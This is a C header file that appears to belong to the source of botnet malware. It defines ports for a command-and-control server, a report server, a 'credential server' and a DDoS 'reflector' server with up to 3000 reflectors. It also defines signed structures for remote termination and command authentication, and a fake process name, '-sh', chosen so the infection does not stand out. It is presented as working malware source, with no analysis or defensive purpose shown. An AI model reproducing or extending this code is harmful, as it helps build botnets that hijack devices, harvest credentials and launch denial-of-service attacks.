#pragma once
#pragma GCC diagnostic ignored "-Wunused-result" 

#include <stdint.h>

enum
{
	STDIN = 0,
	STDOUT = 1,
	STDERR = 2,
	TRUE = 1,
	FALSE = 0,
	// Single instance port
	SINGLE_INSTANCE_PORT = 9658,
	DNS_TXT_MAX_SIZE = 256,
	MAX_DNS_QUERY_TRIES = 10,
	CONTROL_PORT = 7654,
	REFLECTOR_SERVER_PORT = 8989,
	MAX_REFLECTORS = 3000,
	REPORT_SERVER_PORT = 5432,
	CREDENTIAL_SERVER_PORT = 3333,
};

// Signing for remote termination requests
struct termination
{
	uint16_t a, b, c, d, e, f;
};

struct command_auth
{
	uint16_t a, b, c, d, e, f;
	uint16_t arch_len;
	char arch_buf[32];
};

typedef char BOOL;

uint32_t parent_gid;
uint32_t LOCAL_ADDRESS;

// htonl() macro for inet_addr()
#define INET_ADDR(o1,o2,o3,o4) (htonl((o1 << 24) | (o2 << 16) | (o3 << 8) | (o4 << 0)))

// Process name to avoid sticking out like a sore-thumb
#define FAKE_PROCESS_NAME "-sh"
